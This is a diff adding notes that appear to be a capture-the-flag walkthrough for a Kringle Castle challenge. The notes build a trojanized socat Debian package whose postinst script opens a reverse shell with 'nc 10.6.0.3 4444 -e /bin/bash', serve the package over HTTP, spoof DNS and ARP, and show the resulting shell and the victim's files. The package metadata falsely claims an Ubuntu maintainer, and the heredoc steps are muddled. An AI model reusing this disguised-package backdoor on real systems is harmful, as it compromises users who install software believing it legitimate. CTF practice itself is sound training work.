@@ -1,0 +1,51 @@
+https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/
+
+mkdir -p ~/pub/jfrost/backdoor
+
+cp ~/socat_1.7.3.3-2_amd64.deb pub/jfrost/backdoor
+dpkg -x socat_1.7.3.3-2_amd64.deb work
+mkdir work/DEBIAN
+
+cat <<< EOF > work/DEBIAN/control
+Package: suriv
+Version: 1337
+Section: counterhacking 
+Priority: optional
+Architecture: amd64
+Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+Description: NOTE the architecture is amd64, and the name of the package is suriv 
+EOF
+
+cat <<< EOF > work/DEBIAN/postinst
+
+chmod 777 postinst && dpkg-deb --build work
+mv work.deb suriv_amd64.deb
+python3 -m http.server 80
+
+#!/bin/bash
+ping 10.6.0.3 -c 1
+nc 10.6.0.3 4444 -e /bin/bash
+
+EOF
+
+upon installation the bash script will execute on the targets machine granting us a reverse shell on port 4444.
+
+On our attacking machine:
+python3 dns.py &
+python3 arp.py
+
+...and in a console window far, far away:
+
+$ nc -lvp 4444
+
+listening on [any] 4444 ...
+connect to [10.6.0.3] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 45664
+
+> whoami
+jfrost
+
+! 
+ls -l
+NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+
+
